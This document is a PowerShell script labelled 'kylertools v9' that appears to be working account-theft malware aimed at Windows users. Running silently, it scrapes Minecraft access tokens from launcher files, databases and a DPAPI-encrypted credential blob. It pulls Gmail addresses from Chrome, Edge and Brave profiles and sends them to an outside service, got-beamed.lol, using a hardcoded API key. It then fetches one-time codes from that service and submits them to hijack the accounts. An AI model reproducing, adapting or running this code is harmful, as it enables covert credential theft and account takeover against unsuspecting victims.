# language: PowerShell 5.1+, target: Windows 11
# kylertools v9 — MC tokens -> chrome gmails -> got-beamed secure (otp) -> silent execution
# everything inline. silent. no console output. no error leakage. no discord.

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference    = "SilentlyContinue"

try {

# ======================= CONFIG =======================
$API_KEY    = "ek_wpdh3ld6Iosnj_jJalowEe1xiRTqETNoJ6P9OgM3Bq0"
$API_BASE   = "https://got-beamed.lol/api/v1"
$METHOD     = "otp"

$POLL_MS    = 3000
$OTP_WAIT_S = 180

$HDR = @{
    "Authorization" = "Bearer $API_KEY"
    "Content-Type"  = "application/json"
}
$nl = [char]10
# ======================================================

# =================== TEST OVERRIDE ====================
# $gmailList = @("bantqq1@gmail.com")
# ======================================================

# ---------- stage 1: MC token harvest ----------
$found    = @()
$seen     = @{}
$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok,$user,$src,$type)
    if(-not $tok){ return }
    if($tok.Length -lt 80){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += [PSCustomObject]@{ User=$user; Type=$type; Token=$tok; File=$src }
}

function Scan-Text {
    param($text,$src,$user)
    if(-not $text){ return }
    foreach($m in [regex]::Matches($text,$jwtRegex)){
        $v = [string]$m.Value
        if(-not $v){ continue }
        if($v -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
        Add-Token $v $user $src "accessToken"
    }
}

function Scan-File {
    param($path,$user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            if($j -and $j.microsoft_account -and $j.microsoft_account.email){
                $script:found += [PSCustomObject]@{ User=$j.microsoft_account.email; Type="msa-email"; Token=""; File=$path }
            }
            if($j){
                $st = New-Object System.Collections.Stack
                $st.Push($j)
                while($st.Count -gt 0){
                    $n = $st.Pop()
                    if($null -eq $n){ continue }
                    if($n -is [System.Collections.IEnumerable] -and $n -isnot [string]){
                        foreach($it in $n){ $st.Push($it) }
                        continue
                    }
                    if($n -isnot [PSCustomObject]){ continue }
                    $u = $user
                    foreach($k in @("username","name","displayName","profileName")){
                        if($n.PSObject.Properties[$k] -and $n.$k){ $u = $n.$k; break }
                    }
                    if($n.minecraftProfile -and $n.minecraftProfile.name){ $u = $n.minecraftProfile.name }
                    if($n.microsoft_account -and $n.microsoft_account.email){ $u = $n.microsoft_account.email }
                    foreach($k in @("accessToken","token","access_token")){
                        if($n.PSObject.Properties[$k] -and $n.$k){ Add-Token $n.$k $u $path "accessToken" }
                    }
                    foreach($p in $n.PSObject.Properties){
                        if($p.Value -is [PSCustomObject] -or ($p.Value -is [System.Collections.IEnumerable] -and $p.Value -isnot [string])){
                            $st.Push($p.Value)
                        }
                    }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

function Scan-Db {
    param($path,$user)
    if(-not (Test-Path $path)){ return }
    for($t=0; $t -lt 3; $t++){
        $fs=$null; $ms=$null
        try{
            $fs = [IO.File]::Open($path,'Open','Read','ReadWrite')
            $ms = New-Object IO.MemoryStream
            $fs.CopyTo($ms)
            Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
            return
        }catch{}
        finally{
            if($ms){ try{$ms.Dispose()}catch{} }
            if($fs){ try{$fs.Dispose()}catch{} }
        }
    }
}

$paths = @(
 "$env:APPDATA\.minecraft\launcher_accounts.json",
 "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
 "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
 "$env:APPDATA\.minecraft\TlauncherProfiles.json",
 "$env:APPDATA\.minecraft\VaultKey\accounts.json",
 "$env:APPDATA\.minecraft\VaultKey\profiles.json",
 "$env:APPDATA\.minecraft\VaultKey\msa.json",
 "$env:APPDATA\.minecraft\VaultKey\auth.json",
 "$env:APPDATA\.lunarclient\settings\game\accounts.json",
 "$env:APPDATA\.lunarclient\accounts.json",
 "$env:APPDATA\.technic\oauth\accounts.json",
 "$env:APPDATA\.feather\accounts.json",
 "$env:APPDATA\PrismLauncher\accounts.json",
 "$env:APPDATA\MultiMC\accounts.json",
 "$env:APPDATA\PollyMC\accounts.json",
 "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
 "$env:APPDATA\ModrinthApp\launcher_accounts.json",
 "$env:APPDATA\ModrinthApp\launcher_profiles.json",
 "$env:APPDATA\xmcl\user.json",
 "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
 "$env:APPDATA\.salwyrr\accounts.json",
 "$env:APPDATA\.sklauncher\accounts.json",
 "$env:APPDATA\Badlion Client\accounts.json",
 "$env:APPDATA\.minecraft\LabyMod\accounts.json",
 "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
 "$env:APPDATA\.ATLauncher\accounts.json",
 "$env:APPDATA\.minecraft\tl_accounts.json",
 "$env:APPDATA\HMCL\accounts.json",
 "$env:APPDATA\.hmcl\accounts.json"
)
foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }

$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin),$null,"CurrentUser")
        Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
    }catch{}
}

$roots = @(
 "$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp",
 "$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl",
 "$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon",
 "$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL"
)
$inc = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        foreach($f in (Get-ChildItem $r -Recurse -File -Include $inc -EA 0)){
            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
            if($f.Length -gt 1mb){ continue }
            Scan-File $f.FullName "unknown"
        }
    }catch{}
}

$dbs = @(
 "$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm",
 "$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal",
 "$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db",
 "$env:APPDATA\Gml-Launcher\launcher.db"
)
foreach($db in $dbs){ Scan-Db $db "db-scan" }

$wcs = @(
 "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
 "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
 "$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb"
)
foreach($lc in $wcs){
    if(-not (Test-Path $lc)){ continue }
    try{
        foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{}
        }
    }catch{}
}

# ---------- stage 2: chrome gmail discovery ----------
function Get-JwtClaim {
    param([string]$jwt,[string[]]$names)
    try{
        $parts = $jwt.Split('.')
        if($parts.Count -lt 2){ return $null }
        $p = $parts[1].Replace('-','+').Replace('_','/')
        while($p.Length % 4){ $p += "=" }
        $o = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))) | ConvertFrom-Json
        foreach($n in $names){
            if($o.PSObject.Properties[$n] -and $o.$n){ return [string]$o.$n }
        }
    }catch{}
    return $null
}

function Read-PrefsSafe {
    param([string]$path)
    for($i=0; $i -lt 3; $i++){
        $fs=$null; $ms=$null
        try{
            $fs = [IO.File]::Open($path,'Open','Read','ReadWrite')
            $ms = New-Object IO.MemoryStream
            $fs.CopyTo($ms)
            $raw = [Text.Encoding]::UTF8.GetString($ms.ToArray())
            if($raw){ return ($raw | ConvertFrom-Json) }
        }catch{}
        finally{
            if($ms){ try{$ms.Dispose()}catch{} }
            if($fs){ try{$fs.Dispose()}catch{} }
        }
        Start-Sleep -Milliseconds 200
    }
    return $null
}

function Get-ChromeGoogleAccounts {
    $out = @{}
    $roots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Dev\User Data",
        "$env:LOCALAPPDATA\Google\Chrome SxS\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
    )
    foreach($root in $roots){
        if(-not (Test-Path $root)){ continue }
        foreach($p in @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })){
            foreach($pn in @("Preferences","Secure Preferences")){
                $prefs = Join-Path $p.FullName $pn
                if(-not (Test-Path $prefs)){ continue }
                $j = Read-PrefsSafe -path $prefs
                if($j -and $j.account_info){
                    foreach($a in $j.account_info){
                        if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){ $out[$a.email] = $p.FullName }
                    }
                }
            }
        }
    }
    return $out
}

$callerOverride = $null
foreach($sc in @("Global","Script")){
    $v = Get-Variable -Name gmailList -Scope $sc -EA 0
    if($v -and $v.Value){ $callerOverride = @($v.Value); break }
}
if($callerOverride){
    $script:gmailList = $callerOverride
    $gmailSource = "caller"
} else {
    $gmailSource = "none"
    $cg = Get-ChromeGoogleAccounts
    $gm = @{}
    foreach($e in $cg.Keys){ $gm[$e] = $true }
    if($gm.Count -gt 0){ $gmailSource = "chrome-discovery" }
    else {
        $rx = [regex]'^[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)$'
        foreach($t in $found){
            if($t.Token){
                $c = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
                if($c -and $rx.IsMatch($c)){ $gm[$c] = $true }
            }
            if($t.User -and $rx.IsMatch([string]$t.User)){ $gm[[string]$t.User] = $true }
        }
        if($gm.Count -gt 0){ $gmailSource = "token-claim" }
    }
    $script:gmailList = @($gm.Keys)
}

# ==================== got-beamed API layer ====================
$apiTrace = @()

function Api-Post {
    param([string]$path, [hashtable]$body)
    $url = "$API_BASE$path"
    $json = $body | ConvertTo-Json -Compress
    try{
        $r = Invoke-WebRequest -Uri $url -Method Post -Headers $HDR `
                -ContentType "application/json" -Body $json -TimeoutSec 25 `
                -UseBasicParsing -EA Stop
        return @{ ok=$true; status=[int]$r.StatusCode; content=$r.Content }
    } catch {
        $resp = $_.Exception.Response
        $code = 0; $content = ""
        if($resp){
            try{ $code = [int]$resp.StatusCode }catch{}
            try{
                $sr = New-Object IO.StreamReader($resp.GetResponseStream())
                $content = $sr.ReadToEnd(); $sr.Dispose()
            }catch{}
        }
        return @{ ok=$false; status=$code; content=$content }
    }
}

function Api-Get {
    param([string]$path)
    $url = "$API_BASE$path"
    try{
        $r = Invoke-WebRequest -Uri $url -Method Get -Headers $HDR `
                -TimeoutSec 25 -UseBasicParsing -EA Stop
        return @{ ok=$true; status=[int]$r.StatusCode; content=$r.Content }
    } catch {
        $resp = $_.Exception.Response
        $code = 0; $content = ""
        if($resp){
            try{ $code = [int]$resp.StatusCode }catch{}
            try{
                $sr = New-Object IO.StreamReader($resp.GetResponseStream())
                $content = $sr.ReadToEnd(); $sr.Dispose()
            }catch{}
        }
        return @{ ok=$false; status=$code; content=$content }
    }
}

function J { param($s)
    if(-not $s){ return $null }
    try{ return ($s | ConvertFrom-Json) }catch{ return $null }
}

function Extract-Otp {
    param([string]$text)
    if(-not $text){ return $null }
    $heads = @(
        "single[\-\s]?use\s+code","one[\-\s]?time\s+(?:code|password)",
        "verification\s+code","security\s+code","your\s+code\s+is",
        "reset\s+your\s+password","password\s+reset\s+code",
        "einmal(?:iger)?\s+(?:code|Kennwort)","jednorazowy\s+kod",
        "code\s+de\s+v[ée]rification","codice\s+monouso","c[oó]digo\s+de\s+verificaci[oó]n",
        "код\s+подтверждения","ワンタイム\s*コード","일회용\s*코드","一次性(?:密码|代码)"
    )
    $digit = '\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d'
    foreach($hd in $heads){
        $re = [regex]("(?i)" + $hd + "[^\d]{0,80}(" + $digit + ")")
        $m = $re.Match($text)
        if($m.Success){ return ($m.Groups[1].Value -replace '[\s\-]','') }
    }
    $re2 = [regex]("(?<!\d)(" + $digit + ")(?!\d)")
    $m2 = $re2.Match($text)
    if($m2.Success){ return ($m2.Groups[1].Value -replace '[\s\-]','') }
    return $null
}

function Secure-Start {
    param([string]$email)
    $resp = Api-Post -path "/secure" -body @{ method=$METHOD; email=$email }
    $j = J $resp.content
    $script:apiTrace += [PSCustomObject]@{
        call="secure.start"; status="HTTP_$($resp.status)";
        body=($resp.content -replace "\s+"," ")
    }
    if(-not $resp.ok -or -not $j -or -not $j.success){
        return @{ ok=$false; err=(($resp.content -replace "\s+"," ")) }
    }
    $d = $j.data
    $sentTo = ""
    if($d.accounts -and $d.accounts.Count -gt 0){ $sentTo = $d.accounts[0].sentTo }
    return @{
        ok=$true; taskId=$d.taskId; statusUrl=$d.statusUrl;
        submitUrl=$d.submitUrl; status=$d.status; sentTo=$sentTo
    }
}

function Secure-SubmitOtp {
    param([string]$submitPath,[string]$otp)
    $resp = Api-Post -path $submitPath -body @{ otp=$otp }
    $script:apiTrace += [PSCustomObject]@{
        call="secure.otp"; status="HTTP_$($resp.status)";
        body=($resp.content -replace "\s+"," ")
    }
    $j = J $resp.content
    if($resp.ok -and $j -and $j.success){ return @{ ok=$true } }
    return @{ ok=$false; status="HTTP_$($resp.status)"; body=($resp.content -replace "\s+"," ") }
}

function Secure-TaskState {
    param([string]$taskPath)
    $resp = Api-Get -path $taskPath
    $j = J $resp.content
    $script:apiTrace += [PSCustomObject]@{
        call="task.get"; status="HTTP_$($resp.status)";
        body=($resp.content -replace "\s+"," ")
    }
    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false; content=$resp.content } }
    return @{ ok=$true; data=$j.data }
}

function Emails-FindOtp {
    param([string]$email,[int]$waitSec=180)
    $deadline = (Get-Date).AddSeconds($waitSec)
    $lastSaw = ""
    while((Get-Date) -lt $deadline){
        $resp = Api-Get -path "/emails"
        $j = J $resp.content
        if($resp.ok -and $j -and $j.success -and $j.data){
            $items = @()
            if($j.data -is [System.Collections.IEnumerable] -and -not ($j.data -is [string])){ $items = @($j.data) }
            elseif($j.data.emails){ $items = @($j.data.emails) }
            elseif($j.data.items){ $items = @($j.data.items) }
            foreach($it in $items){
                $blob = ($it | ConvertTo-Json -Compress -Depth 8)
                if($email -and $blob -notmatch [regex]::Escape($email)){ continue }
                $code = Extract-Otp $blob
                if($code){ return @{ ok=$true; otp=$code } }
                if(-not $lastSaw){ $lastSaw = $blob.Substring(0,[Math]::Min(400,$blob.Length)) }
            }
            if($items.Count -eq 0 -and -not $lastSaw){ $lastSaw = "/emails empty" }
        } else {
            $lastSaw = "HTTP_$($resp.status) $($resp.content)"
        }
        Start-Sleep -Milliseconds $POLL_MS
    }
    return @{ ok=$false; last=$lastSaw }
}

# ==================== run the flow ====================
$secureResults = @()

if($script:gmailList.Count -gt 0){
    foreach($email in $script:gmailList){
        $s = Secure-Start -email $email
        if(-not $s.ok){ $secureResults += "$email :: START_FAIL :: $($s.err)"; continue }

        $otpRes = Emails-FindOtp -email $s.sentTo -waitSec $OTP_WAIT_S
        if(-not $otpRes.ok){ $secureResults += "$email :: OTP_TIMEOUT :: $($otpRes.last)"; continue }

        $sub = Secure-SubmitOtp -submitPath $s.submitUrl -otp $otpRes.otp
        if(-not $sub.ok){ $secureResults += "$email :: SUBMIT_FAIL ($($sub.status)) :: $($sub.body)"; continue }

        Start-Sleep -Milliseconds 1500
        $ts = Secure-TaskState -taskPath $s.statusUrl
        $final = if($ts.ok){ ($ts.data | ConvertTo-Json -Compress -Depth 10) } else { "poll failed :: $($ts.content)" }
        $secureResults += "$email :: OK :: $($otpRes.otp) :: $final"
    }
}

} catch {}
